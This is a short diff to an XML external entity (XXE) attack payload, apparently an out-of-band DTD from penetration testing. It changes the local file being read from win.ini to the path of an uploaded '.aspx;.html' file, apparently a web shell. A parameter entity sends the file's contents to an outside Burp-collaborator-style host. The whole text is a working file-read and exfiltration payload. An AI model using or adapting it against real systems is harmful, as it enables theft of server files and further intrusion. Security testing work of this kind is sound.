@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % data SYSTEM "file:///D:\QuadXChange\VirtualFolders\BookingFile\CD\20241021_0858521052_shell_gaurav.aspx;.html">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
